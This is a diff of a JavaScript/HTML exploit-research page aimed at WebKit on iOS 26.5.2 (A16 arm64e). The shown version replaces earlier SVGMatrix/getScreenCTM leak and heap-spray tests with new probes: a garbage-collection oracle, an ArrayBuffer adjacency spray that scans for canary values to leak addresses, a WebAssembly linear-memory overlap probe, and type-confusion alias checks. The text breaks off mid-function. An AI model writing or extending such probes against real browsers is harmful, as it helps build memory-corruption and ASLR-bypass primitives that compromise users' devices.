@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG v32 — Ultimate: CTM Leak + viewBox ASLR Primitive</title>
+<title>SVG v33 — Address Primitive Probe</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#000;color:#ccc;font-family:monospace;font-size:11px;padding:12px}
@@ -27,17 +27,17 @@ button:active{background:#0f0;color:#000}
 </style>
 </head>
 <body>
-<h1>▓ SVG v32 — ULTIMATE TEST</h1>
-<h2>CTM leak · viewBox amplification · heap spray · ASLR primitive · iOS 26.5.2 / A16 arm64e</h2>
+<h1>▓ SVG v33 — ADDRESS PRIMITIVE PROBE</h1>
+<h2>heap adjacency · GC oracle · wasm overlap · arraybuffer spray · iOS 26.5.2 / A16 arm64e</h2>
 
 <div class="suite">
 <button id="btn-all" onclick="runAll()">★ RUN ALL</button>
-<button onclick="go('LK')">LK</button>
-<button onclick="go('VX')">VX</button>
-<button onclick="go('SP')">SP</button>
-<button onclick="go('AR')">AR</button>
-<button onclick="go('WR')">WR</button>
-<button onclick="go('CH')">CH</button>
+<button onclick="go('GC')">GC</button>
+<button onclick="go('AB')">AB</button>
+<button onclick="go('WM')">WM</button>
+<button onclick="go('TY')">TY</button>
+<button onclick="go('SZ')">SZ</button>
+<button onclick="go('NB')">NB</button>
 <button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
 <button onclick="clearOut()">✕</button>
 </div>
@@ -45,12 +45,9 @@ button:active{background:#0f0;color:#000}
 
 <script>
 var NS='http://www.w3.org/2000/svg';
-var LU_MAX=33554432;
-var INT32_MAX=2147483647;
 var INT32_OVF=2147483648;
-var F64_MAX=Number.MAX_VALUE;
+var CANARY=0x4141414142424242;  // AAAABBBB as float pattern
 
-// f64 bit manipulation
 var _fb=new ArrayBuffer(8);
 var _dv=new Float64Array(_fb);
 var _uv=new Uint32Array(_fb);
@@ -58,23 +55,12 @@ function f64hi(f){_dv[0]=f;return _uv[1];}
 function f64lo(f){_dv[0]=f;return _uv[0];}
 function f64hex(f){_dv[0]=f;return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');}
 function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}
-
-// build arm64e userspace pointer from hi/lo (PAC-stripped)
-// arm64e userspace: typically 0x0001xxxx_xxxxxxxx
 function isArmPtr(v){
-  if(v===null||v===undefined||isNaN(v))return false;
+  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return false;
   _dv[0]=v;
   var hi=_uv[1];
-  // positive float that could be an arm64 addr (hi=0x00000000-0x0001ffff range)
   if(hi>=0x00000001&&hi<=0x0001ffff)return true;
-  // tagged pointer range
-  if(hi>=0x00ff0000&&hi<=0x00ffffff)return true;
   return false;
-}
-function ptrStr(v){
-  if(!isArmPtr(v))return String(v);
-  _dv[0]=v;
-  return '0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0')+' ← POINTER?';
 }
 
 function log(m,c){
@@ -96,519 +82,502 @@ function copyAll(){
 function go(s){clearOut();window['run'+s]();}
 function runAll(){
   clearOut();
-  runLK();
-  setTimeout(function(){runVX();},800);
-  setTimeout(function(){runSP();},1800);
-  setTimeout(function(){runAR();},3000);
-  setTimeout(function(){runWR();},4500);
-  setTimeout(function(){runCH();},6000);
+  runGC();
+  setTimeout(function(){runAB();},1500);
+  setTimeout(function(){runWM();},3500);
+  setTimeout(function(){runTY();},5500);
+  setTimeout(function(){runSZ();},7000);
+  setTimeout(function(){runNB();},8500);
 }
 
 function mkSVG(w,h,vb){
   var s=document.createElementNS(NS,'svg');
   s.setAttribute('width',w||100);s.setAttribute('height',h||100);
   if(vb)s.setAttribute('viewBox',vb);
-  s.style.cssText='position:fixed;left:0;top:0;width:'+w+'px;height:'+h+'px';
+  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||100)+'px;height:'+(h||100)+'px;opacity:0.001;pointer-events:none';
   document.body.appendChild(s);
   return s;
 }
-function mkSVGHide(w,h,vb){
-  var s=mkSVG(w,h,vb);
-  s.style.opacity='0.001';
-  s.style.pointerEvents='none';
-  return s;
-}
-function mkRect(parent,x,y,w,h){
+function mkRect(p,x,y,w,h){
   var r=document.createElementNS(NS,'rect');
   r.setAttribute('x',x||0);r.setAttribute('y',y||0);
   r.setAttribute('width',w||10);r.setAttribute('height',h||10);
-  parent.appendChild(r);
-  return r;
+  p.appendChild(r);return r;
 }
 function getMX(el){
   el.setAttribute('transform','matrix(1 0 0 1 0 0)');
   return el.transform.baseVal.getItem(0).matrix;
 }
-function bcr(el){try{return el.getBoundingClientRect();}catch(e){return null;}}
 function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}
+function writeMX(mx,v){mx.e=v;return ctm;}
 
 // ════════════════════════════════════════════════════════════════════════
-// LK — CTM leak primitive characterization
-// how precisely does CTM.e track mx.e as we sweep 0 → past 2^31?
-// goal: establish CTM as a true unclamped float64 read primitive
+// GC — GC timing oracle
+// write canary to SVGMatrix, trigger GC, re-read via CTM
+// if value moves/changes: SVGMatrix is on JSC heap (moveable)
+// if value stays exact: SVGMatrix is on native heap (fixed address)
+// CRITICAL: tells us which heap to target
 // ════════════════════════════════════════════════════════════════════════
-function runLK(){
-  hdr('LK: CTM leak primitive — precision sweep');
-  var svg=mkSVGHide(200,200);
+function runGC(){
+  hdr('GC: GC oracle — is SVGMatrix on JSC heap or native heap?');
+  var svg=mkSVG(100,100);
   var r=mkRect(svg,0,0,10,10);
   var mx=getMX(r);
 
-  // key probe values across the full range
-  var probes=[
-    0, 1, 1000, 100000,
-    LU_MAX-1, LU_MAX, LU_MAX+1,
-    INT32_MAX-1, INT32_MAX,
-    INT32_OVF-1, INT32_OVF, INT32_OVF+1,
-    INT32_OVF*2, INT32_OVF*4, INT32_OVF*16,
-    1e10, 1e13, 1e15, 1e16, 1e17,
-    1e20, 1e30, 1e38, 1e100, 1e200, F64_MAX
-  ];
+  // write distinctive canary value
+  var canary=fromHiLo(0x41424344,0x45464748);  // ABCDEFGH
+  mx.e=canary;
+  var c0=ctm(r);
+  var before=c0?c0.e:null;
 
-  var results=[];
-  probes.forEach(function(v){
-    mx.e=v;
-    var b=bcr(r);
-    var c=ctm(r);
-    results.push({
-      set:v,
-      bcr:b?b.x:null,
-      ctme:c?c.e:null
-    });
-  });
-
-  svg.remove();
-
-  hdr('LK[1]: BCR vs CTM across full range');
-  var ctmUnclamped=0,ctmClamped=0,ctmSaturated=0;
-  results.forEach(function(rv){
-    var setStr=rv.set.toExponential(3);
-    var bcrStr=rv.bcr===null?'null':rv.bcr.toExponential(4);
-    var ctmStr=rv.ctme===null?'null':rv.ctme.toExponential(6);
-    var status='';
-    var cls='info';
-    if(rv.set>LU_MAX&&rv.bcr===LU_MAX){ctmClamped++;status='BCR=LU_MAX(clamped)';}
-    else if(rv.set>=INT32_OVF&&rv.bcr===INT32_OVF){ctmSaturated++;status='BCR=2^31(saturated)';}
-    if(rv.ctme!==null&&Math.abs(rv.ctme-rv.set)/Math.max(1,Math.abs(rv.set))<0.001){
-      ctmUnclamped++;status+=' CTM=SET(unclamped!)';cls='leak';
-    } else if(rv.ctme!==null&&rv.ctme!==rv.bcr){
-      status+=' CTM≠BCR(divergence)';cls='star';
+  // trigger GC: allocate and discard lots of objects
+  function triggerGC(){
+    var junk=[];
+    for(var i=0;i<50000;i++){
+      junk.push({a:new Array(100).fill(i),b:new Float64Array(16)});
     }
-    log('LK[1]: set='+setStr+' BCR='+bcrStr+' CTM.e='+ctmStr+' '+status,cls);
-  });
+    junk=null;
+    // also create/destroy SVG elements to pressure SVG allocator
+    for(var j=0;j<1000;j++){
+      var tmp=mkSVG(10,10);
+      mkRect(tmp,0,0,5,5);
+      tmp.remove();
+    }
+  }
 
-  log('LK[2]: summary: CTM unclamped='+ctmUnclamped+'/'+probes.length+
-    ' BCR LU-clamped='+ctmClamped+' BCR 2^31-saturated='+ctmSaturated,
-    ctmUnclamped>5?'leak — CTM IS UNCLAMPED READ PRIMITIVE':'warn');
+  triggerGC();
 
-  // LK[3]: measure CTM precision vs set value — is it exact f64?
-  hdr('LK[3]: CTM precision — exact f64 or truncated?');
-  var svg2=mkSVGHide(200,200);
+  // read back
+  var c1=ctm(r);
+  var after=c1?c1.e:null;
+  var survived=(after===before);
+
+  log('GC[1]: canary='+f64hex(canary)+' before='+before+' after='+after+' survived='+survived,
+    survived?'star — CANARY SURVIVED GC: native heap (fixed addr) or GC-pinned':
+    'uaf — CANARY CHANGED AFTER GC: JSC heap (object moved!)');
+  log('GC[1]: implication: '+(survived?
+    'SVGMatrix likely on WebCore native heap — fixed address, predictable layout':
+    'SVGMatrix on JSC heap — may be accessible via JSC primitives'),
+    survived?'star':'leak');
+
+  // GC[2]: does the SVGMatrix wrapper JS object survive GC when only the rect holds it?
+  hdr('GC[2]: wrapper survival — does matrix JS object get GC\'d if rect loses ref?');
+  var svg2=mkSVG(100,100);
   var r2=mkRect(svg2,0,0,10,10);
   var mx2=getMX(r2);
+  mx2.e=fromHiLo(0xdeadbeef,0xcafebabe);
+  // detach rect from SVG (should allow GC of the rect's JS wrapper)
+  r2.remove();
+  triggerGC();
+  // try to read back via the now-detached rect
+  var c2=null;
+  try{c2=r2.getScreenCTM();}catch(e){c2=null;}
+  log('GC[2]: read after rect.remove()+GC: '+(c2?'got CTM.e='+c2.e:'null/exception'),
+    c2===null?'info — CTM null after detach (expected)':
+    c2.e===fromHiLo(0xdeadbeef,0xcafebabe)?'uaf — VALUE SURVIVED DETACH: dangling ref!':'warn — different value');
 
-  // test with values that have known bit patterns
-  var precTests=[
-    1.5,          // exact in f64
-    Math.PI,      // irrational, truncated to 15.9 digits
-    1/3,          // repeating
-    1e15+0.1,     // large + small fraction
-    INT32_OVF+0.5,// just past 2^31 with fraction
-    INT32_OVF*1.5 // 3*2^30
-  ];
-  precTests.forEach(function(v){
-    mx2.e=v;
-    var c=ctm(r2);
-    var got=c?c.e:null;
-    var exact=(got===v);
-    var diff=got===null?null:Math.abs(got-v);
-    log('LK[3]: set='+v+' CTM.e='+got+' exact='+exact+' diff='+diff,
-      exact?'leak — EXACT f64 round-trip!':diff<1?'star — close (<1 diff)':'warn — precision loss: '+diff);
-  });
-  svg2.remove();
-  prog('LK done');
+  svg.remove();svg2.remove();
+  prog('GC done');
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// VX — viewBox amplification precision
-// how precisely does viewBox scale translate to BCR and CTM?
-// can we use viewBox ratio to place elements at arbitrary float positions?
+// AB — ArrayBuffer adjacency spray
+// spray ArrayBuffers of known sizes around SVGMatrix allocations
+// write canary to SVGMatrix.e, scan ArrayBuffers for the canary
+// if found: we know the offset between AB and SVGMatrix → address leak
 // ════════════════════════════════════════════════════════════════════════
-function runVX(){
-  hdr('VX: viewBox amplification precision map');
+function runAB(){
+  hdr('AB: ArrayBuffer adjacency spray');
+  var SPRAY_N=512;
+  var AB_SIZE=256;  // bytes, must cover a potential SVGMatrix struct
 
-  // VX[1]: fixed viewBox, vary element position
-  // svg 100x100 with viewBox 0 0 1e-6 1e-6 → scale = 1e8
-  // rect at x=k*1e-6 should appear at BCR.x = k*100
-  hdr('VX[1]: viewBox 1e-6 scale precision');
-  var scale=1e-6;
-  var svgW=100;
-  var vbStr='0 0 '+scale+' '+scale;
-  var svg1=mkSVGHide(svgW,svgW,vbStr);
-  var xTests=[0,0.1,0.25,0.5,0.75,1.0];  // in viewBox coords
-  var vx1Results=[];
-  xTests.forEach(function(xvb){
-    var r=mkRect(svg1,xvb,0,scale/10,scale/10);
-    var b=bcr(r);
-    var c=ctm(r);
-    var expectedBCR=xvb/scale*svgW;  // expected screen x
-    vx1Results.push({xvb:xvb,bcr:b?b.x:null,ctme:c?c.e:null,expected:expectedBCR});
-  });
-  svg1.remove();
-  vx1Results.forEach(function(rv){
-    var err=rv.bcr===null?null:Math.abs(rv.bcr-rv.expected);
-    log('VX[1]: xvb='+rv.xvb+' expected='+rv.expected.toFixed(2)+
-      ' BCR.x='+rv.bcr+' CTM.e='+rv.ctme+' err='+(err===null?'null':err.toFixed(4)),
-      err===null?'warn':err<0.01?'leak — SUB-PIXEL PRECISION':err<1?'pass':'warn — coarse');
-  });
+  // canary as float64 — distinctive bit pattern
+  var canaryVal=fromHiLo(0x13371337,0xdeadbeef);
+  log('AB[1]: canary value='+f64hex(canaryVal),'info');
 
-  // VX[2]: scale ramp — find where viewBox amplification breaks down
-  hdr('VX[2]: viewBox scale ramp — when does BCR stop tracking?');
-  var scales=[1e-3,1e-4,1e-5,1e-6,1e-7,1e-8,1e-9,1e-10];
-  scales.forEach(function(sc){
-    var svgvb=mkSVGHide(100,100,'0 0 '+sc+' '+sc);
-    var rr=mkRect(svgvb,sc/2,0,sc/10,sc/10);
-    var b=bcr(rr);
-    var c=ctm(rr);
-    var expectedX=50;  // sc/2 / sc * 100 = 50
-    svgvb.remove();
-    var bx=b?b.x:null;
-    var diff=bx===null?null:Math.abs(bx-expectedX);
-    log('VX[2]: scale='+sc.toExponential(0)+' expectedX=50 BCR.x='+bx+' CTM.a='+(c?c.a.toExponential(4):null)+
-      ' err='+(diff===null?'null':diff.toFixed(2)),
-      diff===null?'warn':diff<0.1?'leak — PERFECT':diff<2?'pass':diff>10?'warn — BROKEN AT THIS SCALE':'info');
-  });
-  prog('VX done');
-}
+  // interleave: AB, SVG, AB, SVG... to maximize adjacency chance
+  var abs=[];
+  var svgs=[];
+  var mxs=[];
 
-// ════════════════════════════════════════════════════════════════════════
-// SP — heap spray via SVGMatrix.e
-// create N elements, set mx.e to values derived from known JSC heap constants
-// read back CTM.e to see if values survive the round-trip through layout
-// goal: establish write→read round-trip for arbitrary float64 values
-// ════════════════════════════════════════════════════════════════════════
-function runSP(){
-  hdr('SP: heap spray via SVGMatrix — write/read round-trip');
-  var N=200;
-  var svg=mkSVGHide(200,200);
-  var rects=[],mxs=[];
-
-  for(var i=0;i<N;i++){
-    var r=mkRect(svg,0,0,5,5);
-    getMX(r);
-    mxs.push(r.transform.baseVal.getItem(0).matrix);
-    rects.push(r);
+  for(var i=0;i<SPRAY_N;i++){
+    abs.push(new ArrayBuffer(AB_SIZE));
+    var s=mkSVG(50,50);
+    var rr=mkRect(s,0,0,5,5);
+    getMX(rr);
+    mxs.push(rr.transform.baseVal.getItem(0).matrix);
+    svgs.push(s);
   }
 
-  // SP[1]: write sequential floats, verify round-trip
-  hdr('SP[1]: sequential float write/read round-trip (N='+N+')');
-  var writeVals=[];
-  for(var j=0;j<N;j++){
-    // write values that span different magnitudes
-    var v=1e10*(j+1);
-    writeVals.push(v);
-    mxs[j].e=v;
-  }
-  // read back via CTM
-  var readOK=0,readFail=0,maxErr=0;
-  for(var k=0;k<N;k++){
-    var c=ctm(rects[k]);
-    var got=c?c.e:null;
-    var expected=writeVals[k];
-    if(got===null){readFail++;continue;}
-    var err=Math.abs(got-expected)/expected;
-    if(err<1e-6)readOK++;
-    else{readFail++;if(err>maxErr)maxErr=err;}
-  }
-  log('SP[1]: write/read round-trip: OK='+readOK+'/'+N+' FAIL='+readFail+' maxRelErr='+maxErr.toExponential(2),
-    readOK===N?'leak — PERFECT ROUND-TRIP! CTM is lossless read primitive':
-    readOK>N*0.9?'star — HIGH FIDELITY round-trip: '+readOK+'/'+N:'warn — losses: '+readFail);
+  // write canary to ALL matrices
+  mxs.forEach(function(m){m.e=canaryVal;});
 
-  // SP[2]: write specific bit patterns (simulated pointer values)
-  hdr('SP[2]: pointer-pattern write/read round-trip');
-  // arm64e userspace addresses live at 0x0001xxxx_xxxxxxxx
-  // as float64, hi=0x00010000 → value = fromHiLo(0x00010000, 0x00000000) ≈ 2.2e-308 * 2^(16) ≈ tiny
-  // actually let's think: a pointer like 0x000000010abcdef0
-  // hi32 = 0x00000001, lo32 = 0x0abcdef0
-  // as double: sign=0, exp bits from hi: 0x0000_0001 → biased exp = 0x000 (denorm) → very small
-  // so raw pointer value as f64 is TINY and may get flushed to 0 in layout math
-  // Instead: test if we can round-trip arbitrary hi/lo by writing them and reading CTM
-  var ptrTests=[
-    {hi:0x00000001,lo:0x00000000,name:'arm64 null page boundary'},
-    {hi:0x00000001,lo:0x0fabcde0,name:'arm64e typical heap ptr'},
-    {hi:0x0001b000,lo:0x00000000,name:'JSC heap region start'},
-    {hi:0x41414141,lo:0x41414141,name:'canary AAAA pattern'},
-    {hi:0x3ff00000,lo:0x00000000,name:'float64 1.0'},
-    {hi:0x40000000,lo:0x00000000,name:'float64 2.0'},
-    {hi:0x43e00000,lo:0x00000000,name:'float64 2^63'},
-  ];
-  ptrTests.forEach(function(pt,idx){
-    var v=fromHiLo(pt.hi,pt.lo);
-    if(idx<mxs.length){
-      mxs[idx].e=v;
-      var c=ctm(rects[idx]);
-      var got=c?c.e:null;
-      var exact=(got===v);
-      log('SP[2]: '+pt.name+' write='+f64hex(v)+' read='+(got===null?'null':f64hex(got))+' exact='+exact,
-        exact?'leak — EXACT BIT PATTERN PRESERVED!':
-        got===null?'warn':'info — read='+got);
+  // scan every ArrayBuffer for the canary hi/lo words
+  var canaryHi=0x13371337;
+  var canaryLo=0xdeadbeef;
+  var hits=[];
+
+  abs.forEach(function(ab,abIdx){
+    var view=new Uint32Array(ab);
+    for(var off=0;off<view.length-1;off+=1){
+      if(view[off]===canaryLo&&view[off+1]===canaryHi){
+        hits.push({abIdx:abIdx,byteOffset:off*4,view:view});
+      }
+      if(view[off]===canaryHi&&view[off+1]===canaryLo){
+        hits.push({abIdx:abIdx,byteOffset:off*4,view:view,swapped:true});
+      }
     }
   });
 
-  svg.remove();
-  prog('SP done');
-}
+  log('AB[1]: sprayed '+SPRAY_N+' AB+SVG pairs, scanned '+SPRAY_N+' ArrayBuffers ('+AB_SIZE+'B each)',
+    hits.length>0?'aslr — CANARY FOUND IN ARRAYBUFFER! hits='+hits.length:
+    'info — canary not found in ABs (expected on separate allocators)');
 
-// ════════════════════════════════════════════════════════════════════════
-// AR — ASLR bypass attempt
-// theory: if CTM.e leaks layout positions with high precision,
-// and we know the viewBox scale, we can recover the actual screen-space
-// float coordinate used internally — which may correlate with heap layout
-// approach: create many elements, spread them across a large viewBox coordinate space,
-// measure if CTM.e values reveal a non-uniform distribution (heap fragmentation pattern)
-// ════════════════════════════════════════════════════════════════════════
-function runAR(){
-  hdr('AR: ASLR bypass probe — layout coordinate leak');
-  var N=64;
-  // use very large viewBox so internal float coords are large
-  // scale = 1e12 / 100 = 1e10 per pixel
-  var vbMax=1e12;
-  var svgW=100;
-  var svg=mkSVGHide(svgW,svgW,'0 0 '+vbMax+' '+vbMax);
-  var rects=[];
-
-  // place elements at regular vb intervals
-  var step=vbMax/N;
-  for(var i=0;i<N;i++){
-    var xvb=i*step;
-    var r=mkRect(svg,xvb,0,step/2,step/2);
-    rects.push({r:r,xvb:xvb,expected:xvb/vbMax*svgW});
-  }
-
-  // read CTM.e for each element
-  hdr('AR[1]: CTM.e at large viewBox coords (vbMax=1e12)');
-  var ctmVals=[],bcrVals=[];
-  rects.forEach(function(rv){
-    var b=bcr(rv.r);
-    var c=ctm(rv.r);
-    ctmVals.push(c?c.e:null);
-    bcrVals.push(b?b.x:null);
-  });
-
-  var ctmOK=ctmVals.filter(function(v){return v!==null;}).length;
-  var ctmRange=ctmVals.filter(function(v){return v!==null;});
-  var ctmMin=Math.min.apply(null,ctmRange);
-  var ctmMax=Math.max.apply(null,ctmRange);
-
-  log('AR[1]: CTM.e range: '+ctmMin.toExponential(4)+' → '+ctmMax.toExponential(4)+
-    ' span='+((ctmMax-ctmMin)).toExponential(4)+' samples='+ctmOK+'/'+N,
-    ctmMax>1e9?'leak — LARGE INTERNAL COORDS IN CTM':ctmMax>1e6?'star — moderate range':'warn — small range');
-
-  // AR[2]: check if CTM values deviate from expected linear spacing
-  hdr('AR[2]: linearity check — do CTM values deviate from expected?');
-  var deviations=[];
-  rects.forEach(function(rv,idx){
-    var c=ctm(rv.r);
-    if(c===null)return;
-    // expected: CTM.e should track the internal accumulated translation
-    // for a pure viewBox scale with no other transform, CTM.a = scale = svgW/vbMax
-    // CTM.e should be 0 for all elements (position is encoded in the element's own transform,
-    // not carried through CTM for elements without getScreenCTM relative-to-document)
-    var ctma=c.a;
-    var ctme=c.e;
-    var ctmf=c.f;
-    var expectedScale=svgW/vbMax;
-    var scaleErr=Math.abs(ctma-expectedScale)/expectedScale;
-    deviations.push({idx:idx,ctma:ctma,ctme:ctme,ctmf:ctmf,scaleErr:scaleErr,
-      expectedE:rv.expected});
-  });
-
-  if(deviations.length>0){
-    var d0=deviations[0];
-    log('AR[2]: CTM.a='+d0.ctma.toExponential(6)+' (expected='+( svgW/vbMax).toExponential(4)+
-      ') scaleErr='+d0.scaleErr.toExponential(2),
-      d0.scaleErr<0.001?'pass — scale correct':'warn — scale deviation: '+d0.scaleErr);
-
-    // the interesting bit: does CTM.e differ between elements?
-    var eVals=deviations.map(function(d){return d.ctme;});
-    var eMin=Math.min.apply(null,eVals);
-    var eMax=Math.max.apply(null,eVals);
-    log('AR[2]: CTM.e spread: min='+eMin+' max='+eMax+' span='+(eMax-eMin),
-      (eMax-eMin)>1?'leak — CTM.e VARIES BETWEEN ELEMENTS: positional leak!':
-      (eMax-eMin)===0?'info — CTM.e constant across all elements (no positional data in CTM.e)':
-      'star — small CTM.e variation: '+(eMax-eMin));
-
-    // print first few
-    deviations.slice(0,6).forEach(function(d){
-      log('AR[2]: elem['+d.idx+']: CTM.a='+d.ctma.toExponential(4)+
-        ' CTM.e='+d.ctme+' CTM.f='+d.ctmf+' expected_screen_x='+d.expectedE.toFixed(3),'info');
+  if(hits.length>0){
+    hits.slice(0,3).forEach(function(h){
+      log('AB[1]: HIT: ab['+h.abIdx+'] offset='+h.byteOffset+(h.swapped?' (swapped)':''),
+        'aslr — SVGMatrix ADJACENT TO ARRAYBUFFER: addr leak possible!');
+      // dump surrounding bytes
+      var dumpStart=Math.max(0,(h.byteOffset/4)-4);
+      var dumpEnd=Math.min(h.view.length,dumpStart+16);
+      var dump=[];
+      for(var k=dumpStart;k<dumpEnd;k++)dump.push(h.view[k].toString(16).padStart(8,'0'));
+      log('AB[1]:   dump['+dumpStart*4+']: '+dump.join(' '),'leak');
     });
   }
 
-  svg.remove();
+  // AB[2]: try Float64Array view to catch full f64 canary
+  hdr('AB[2]: Float64Array scan for exact canary');
+  var f64hits=[];
+  abs.forEach(function(ab,abIdx){
+    var fview=new Float64Array(ab);
+    for(var off=0;off<fview.length;off++){
+      if(fview[off]===canaryVal){
+        f64hits.push({abIdx:abIdx,f64off:off});
+      }
+    }
+  });
+  log('AB[2]: Float64Array scan: hits='+f64hits.length,
+    f64hits.length>0?'aslr — EXACT F64 CANARY IN ARRAYBUFFER!':
+    'info — no f64 hits (SVGMatrix not sharing AB backing store)');
 
-  // AR[3]: mx.e + CTM.e divergence at boundary — does CTM expose internal representation?
-  hdr('AR[3]: mx.e sweep near 2^31 — CTM.e internal representation leak');
-  var svg3=mkSVGHide(200,200);
+  svgs.forEach(function(s){s.remove();});
+  prog('AB done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// WM — WebAssembly memory overlap probe
+// allocate wasm linear memory, then create SVGMatrix
+// check if wasm memory contains canary written to SVGMatrix
+// WASM linear memory is a large contiguous ArrayBuffer — better coverage
+// ════════════════════════════════════════════════════════════════════════
+function runWM(){
+  hdr('WM: WebAssembly memory overlap probe');
+
+  // check wasm support
+  if(typeof WebAssembly==='undefined'){
+    log('WM[1]: WebAssembly not available','warn');
+    prog('WM done');
+    return;
+  }
+
+  // minimal wasm module that exports its memory
+  // (mem 1 32) = 1 initial page (64KB), 32 max pages (2MB)
+  var wasmBytes=new Uint8Array([
+    0x00,0x61,0x73,0x6d, // magic
+    0x01,0x00,0x00,0x00, // version
+    0x05,0x04,0x01,0x01,0x00,0x20, // memory section: 1 mem, min=1, max=32
+    0x07,0x07,0x01,0x03,0x6d,0x65,0x6d,0x02,0x00  // export "mem" memory 0
+  ]);
+
+  WebAssembly.instantiate(wasmBytes).then(function(result){
+    var mem=result.instance.exports.mem;
+    if(!mem){log('WM[1]: no exported memory','warn');return;}
+
+    var wasmBuf=mem.buffer;
+    var wasmU32=new Uint32Array(wasmBuf);
+    var wasmF64=new Float64Array(wasmBuf);
+    var wasmSize=wasmBuf.byteLength;
+
+    log('WM[1]: wasm memory size='+wasmSize+' bytes ('+( wasmSize/1024)+'KB)','info');
+
+    // write canary to wasm memory at known offsets
+    var wmCanaryHi=0x57415353;  // "WASS"
+    var wmCanaryLo=0x4d454d4f;  // "MEMO"
+    var wmCanary=fromHiLo(wmCanaryHi,wmCanaryLo);
+
+    // fill wasm memory with canary pattern
+    for(var wi=0;wi<Math.min(wasmU32.length,16384);wi+=2){
+      wasmU32[wi]=wmCanaryLo;
+      wasmU32[wi+1]=wmCanaryHi;
+    }
+
+    // now create SVGMatrix and write a different canary
+    var svg=mkSVG(100,100);
+    var r=mkRect(svg,0,0,10,10);
+    getMX(r);
+    var mx=r.transform.baseVal.getItem(0).matrix;
+    var svgCanary=fromHiLo(0x53564753,0x56475653);
+    var svgCanary2=svgCanary;
+    mx.e=svgCanary2;
+    mx.f=svgCanary2;
+
+    // scan wasm memory for svgCanary2
+    var svgHi2=0x53564753;
+    var svgLo2=0x56475653;
+    var wmhits=[];
+    for(var wj=0;wj<Math.min(wasmU32.length-1,16384);wj++){
+      if(wasmU32[wj]===svgLo2&&wasmU32[wj+1]===svgHi2){
+        wmhits.push(wj*4);
+      }
+    }
+
+    log('WM[2]: SVGMatrix canary in wasm memory: hits='+wmhits.length,
+      wmhits.length>0?'aslr — SVG CANARY IN WASM MEMORY: OVERLAP! offset='+wmhits[0]:
+      'info — no overlap (SVGMatrix not in wasm linear memory, expected)');
+
+    // WM[3]: reverse — write pattern to wasm mem, read SVGMatrix
+    // if SVGMatrix is IN wasm memory, we can corrupt it via wasm writes
+    hdr('WM[3]: wasm→SVGMatrix write test');
+    // find where mx.e is currently stored by probing
+    var knownVal=fromHiLo(0xAAAAAAAA,0xBBBBBBBB);
+    mx.e=knownVal;
+    var knownHi=0xAAAAAAAA;
+    var knownLo=0xBBBBBBBB;
+    var found=-1;
+    for(var wk=0;wk<Math.min(wasmU32.length-1,16384);wk++){
+      if(wasmU32[wk]===knownLo&&wasmU32[wk+1]===knownHi){found=wk*4;break;}
+    }
+    log('WM[3]: SVGMatrix.e in wasm mem at offset: '+(found>=0?found:'NOT FOUND'),
+      found>=0?'aslr — SVGMatrix IS IN WASM LINEAR MEMORY! offset='+found:
+      'info — SVGMatrix not in wasm linear memory (separate native heap)');
+
+    svg.remove();
+    prog('WM done');
+  }).catch(function(e){
+    log('WM[1]: wasm instantiate failed: '+e,'warn');
+    prog('WM done');
+  });
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// TY — type confusion probe
+// SVGMatrix implements DOMMatrix interface
+// test if we can get a DataView / TypedArray alias onto the same backing memory
+// via DOMMatrix → Float64Array path (non-standard but sometimes exposed)
+// ════════════════════════════════════════════════════════════════════════
+function runTY(){
+  hdr('TY: type confusion / DOMMatrix alias probe');
+
+  // TY[1]: DOMMatrix from SVGMatrix — do they share backing storage?
+  hdr('TY[1]: SVGMatrix → DOMMatrix — shared backing?');
+  var svg=mkSVG(100,100);
+  var r=mkRect(svg,0,0,10,10);
+  var svgMX=getMX(r);
+  var canary=fromHiLo(0xC0FEC0FE,0xBEEFBEEF);
+  svgMX.e=canary;
+
+  // try to get DOMMatrix from the element
+  var dm=null;
+  try{dm=new DOMMatrix(r.getAttribute('transform'));}catch(e){}
+
+  if(dm){
+    log('TY[1]: DOMMatrix created from transform attr: e='+dm.e+' (expected '+canary+')',
+      dm.e===canary?'leak — DOMMatrix.e === SVGMatrix canary: same backing!':
+      'info — DOMMatrix.e='+dm.e+' (independent copy)');
+  } else {
+    log('TY[1]: DOMMatrix not available or failed','info');
+  }
+
+  // TY[2]: SVGMatrix via consolidate — does consolidate create new object or alias?
+  hdr('TY[2]: SVGTransformList.consolidate() alias probe');
+  var canary2=fromHiLo(0xFEEDFACE,0xCAFEBABE);
+  svgMX.e=canary2;
+  var consolidated=null;
+  try{
+    r.transform.baseVal.consolidate();
+    consolidated=r.transform.baseVal.getItem(0).matrix;
+  }catch(e){}
+
+  if(consolidated){
+    var sameObj=(consolidated===svgMX);
+    log('TY[2]: consolidated matrix: e='+consolidated.e+
+      ' same_obj='+(consolidated===svgMX),
+      consolidated.e===canary2?
+        (sameObj?'leak — SAME OBJECT: consolidate returns existing matrix!':
+         'info — same value but different JS object'):
+      'warn — different value after consolidate: '+consolidated.e);
+  }
+
+  // TY[3]: multiple getItem(0) calls — same backing object?
+  hdr('TY[3]: multiple getItem(0) — shared backing?');
+  var mx1=r.transform.baseVal.getItem(0).matrix;
+  var mx2=r.transform.baseVal.getItem(0).matrix;
+  var testVal=fromHiLo(0x11111111,0x22222222);
+  mx1.e=testVal;
+  var sameRef=(mx2.e===testVal);
+  log('TY[3]: write to mx1.e, read mx2.e: got='+mx2.e+' match='+sameRef,
+    sameRef?'leak — SHARED BACKING: mx1 and mx2 alias same memory!':
+    'info — independent: mx1 and mx2 are separate objects');
+
+  // TY[4]: SVGTransform.matrix vs element.getCTM() — shared?
+  hdr('TY[4]: SVGTransform.matrix vs getCTM — same object?');
+  var txMatrix=r.transform.baseVal.getItem(0).matrix;
+  var testVal2=fromHiLo(0x33333333,0x44444444);
+  txMatrix.e=testVal2;
+  var localCTM=null;
+  try{localCTM=r.getCTM();}catch(e){}
+  if(localCTM){
+    log('TY[4]: txMatrix.e='+testVal2+' getCTM().e='+localCTM.e,
